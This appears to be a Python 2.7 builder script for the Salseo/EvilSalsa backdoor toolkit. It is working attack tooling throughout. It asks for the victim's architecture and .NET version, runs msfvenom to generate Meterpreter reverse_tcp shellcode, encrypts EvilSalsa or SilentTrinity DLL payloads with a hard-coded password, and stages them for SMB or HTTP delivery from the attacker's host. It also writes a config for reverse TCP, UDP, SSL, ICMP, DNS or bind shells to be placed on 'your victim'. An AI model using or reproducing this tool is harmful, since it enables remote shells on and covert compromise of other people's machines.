#!/usr/bin/python2.7

import os


def createElmal(elmal, password, arch=None, dotNET=None):
	print("[*] Encrypting payload...")
	if elmal == "silenttrinity":
		if arch == "1": #x86
			os.system("../encrypterassembly.py ../SilentMOD/NET4.5/SilentMOD_x86.dll " + password + " elmal.txt")
		else:
			os.system("../encrypterassembly.py ../SilentMOD/NET4.5/SilentMOD_x64.dll " + password + " elmal.txt")

	elif elmal == "shellcode": #Meterpreter shellcode.
		os.system("../encrypterassembly.py " + elmal + " " + password + " pwn.txt")
	else: #Salsa
		if arch == "1": arch = "x86"
		else:			arch = "x64"
		if dotNET == "1": dotNET = "NET3.5"
		elif dotNET == "2": dotNET = "NET4.0"
		elif dotNET == "3": dotNET = "NET4.5"
			
		os.system("../encrypterassembly.py ../EvilSalsa/" + dotNET + "/EvilSalsa_" + arch + ".dll " + password + " elmal.txt")
		

def writeFile(arg1, arg2, arg3, arg4=None, arg5=None):
	file = open("./mandanga.txt", "w")
	file.write(arg1 + '\n' + arg2 + '\n' + arg3)
	if arg4 != None:
		file.write('\n' + arg4)
	if arg5 != None:
		file.write('\n' + arg5)
	file.close()

def setArch():
	done = False
	while done != True:
		print("Select victim's arch: ")
		print("[1] x86")
		print("[2] x64")
		print("")
		arch = raw_input()
		if arch == "1" or arch == "2":
			done = True
	return arch

def setNET():
	done = False
	while done != True:
		print("Select victim's .NET version: ")
		print("[1] .NET3.5")
		print("[2] .NET4.0")
		print("[3] .NET4.5")
		print("")
		dotNET = raw_input()
		if dotNET == "1" or dotNET == "2" or dotNET == "3":
			done = True
	return dotNET


def createPayload(password):
	arch = setArch()
	if arch == "1":
		payload = "windows/meterpreter/reverse_tcp"
		done = True
	elif arch == "2":
		payload = "windows/x64/meterpreter/reverse_tcp"
		done = True
	
	lhost = raw_input("Select LHOST: ")
	lport = raw_input("Select LPORT: ")

	#msfvenom creation
	command = "msfvenom -p " + payload + " LHOST=" + lhost + " LPORT=" + lport + " -f raw > meter"
	print("[*] Generating payload " + command)
	os.system(command)
	#encrypterassembly
	createElmal("./meter", password)
	os.system("rm ./meter")#delete msfvenom result
	return lhost,lport
	

def setServingMode():
	done = False
	while done != True:
		print("[1] SMB")
		print("[2] HTTP")
		print("")
		mode = raw_input()
		if mode == "1":
			print("[!!!] Start a SMBSERVER on current path (shared folder name: resources)")
			done = True
		elif mode == "2":
			print("[!!!] Start an HTTP SERVER on current path (port 80)")
			done = True
	return mode	


def setFunction():
	done = False
	while (done != True):
		print("Select mode: ")
		print("[1] ReverseTCP")
		print("[2] ReverseUDP")
		print("[3] ReverseSSL")
		print("[4] ReverseICMP")
		print("[5] ReverseDNS")
		print("[6] BindTCP")
		print("[7] SilentTrinity")
		print("[8] Meterpreter reverse_tcp")
		print("")
		function = raw_input()
		if (function == "1" or function == "2" or function == "3" or function == "4" or function == "5" or function == "6" or function == "7" or function == "8"):
			done = True

	return function


def main():
	'''
	Main function
	[-] Mandanga.txt contents:
        [-] Reverse TCP/UDP/SSL     [-] Reverse ICMP        [-] Reverse DNS
            <password>                  <password>              <password>
            <path_to_elmal.txt>         <path_to_elmal.txt>     <path_to_elmal.txt>
            reversetcp/udp/ssl          reverseicmp             reversedns
            <LHOST>                     <LHOST>                 <LHOST>
            <LPORT>                                             <DNS Server>

        [-] Bind TCP                [-] SilentTrinity       [-] Shellcode
            <password>                  <password>              <password>
            <path_to_elmal.txt>         <path_to_elmal.txt>     <path_to_payload.txt>
            bindtcp                     silenttrinity           shellcode
            <LHOST>                     <URL_to_C2C>             
            <LPORT> 
	'''

	function = setFunction()
	password = "tomate"
	#password = raw_input("Set encryption password: ")


	if function == "8": #Meterpreter
		lhost,lport = createPayload(password)
		print("How do you want to serve your payload? ")
		mode = setServingMode()
		if mode == "1": #SMB
			path = "\\\\\\\\" + lhost + "\\\\resources\\\\pwn.txt"
		else:
			path = "http://" + lhost + "/pwn.txt"

		function = "shellcode"
		writeFile(password, path, function)
	elif function == "7": #SilentTrinity
		print("Enter your IP: ")
		lhost = raw_input()
		print("Enter SilentTrinity C2C URL: ")
		url = raw_input()
		arch = setArch()
		print("[*] Only .NET version available: 4.5...")
		createElmal("silenttrinity", password, arch)
		
		mode = setServingMode()
		if mode == "1": #SMB
			path = "\\\\\\\\" + lhost + "\\\\resources\\\\elmal.txt"
		else:
			path = "http://" + lhost + "/elmal.txt"
		writeFile(password,path,"silenttrinity",url)
	else:
		print("Enter your IP: ")
		lhost = raw_input()
		
		if function == "5":
			print("Enter DNS server IP: ")
			dnsserver = raw_input()
		elif function != "4":
	 		print("Enter your port: ")
			lport = raw_input()
		
		arch = setArch()
		dotNET = setNET()
		createElmal("salsa", password, arch, dotNET)
		
		mode = setServingMode()
		if mode == "1": #SMB
			path = "\\\\\\\\" + lhost + "\\\\resources\\\\elmal.txt"
		else:
			path = "http://" + lhost + "/elmal.txt"

		if function == "1":		function = "reversetcp"
		elif function == "2": 	function = "reverseudp"
		elif function == "3": 	function = "reversessl"
		elif function == "4":	function = "reverseicmp"
		elif function == "5":	function = "reversedns"		
		elif function == "6": 	function = "bindtcp"

		if function == "reverseicmp":
			writeFile(password,path,function,lhost)
		elif function == "reversedns":
			writeFile(password,path,function,lhost,dnsserver)
		else:
			writeFile(password,path,function,lhost,lport)

	print("")
	print("[+] mandanga.txt created.")
	print("Please, copy it on the same folder than SalseoStandalone.exe on your victim.")


if __name__ == "__main__":
	main()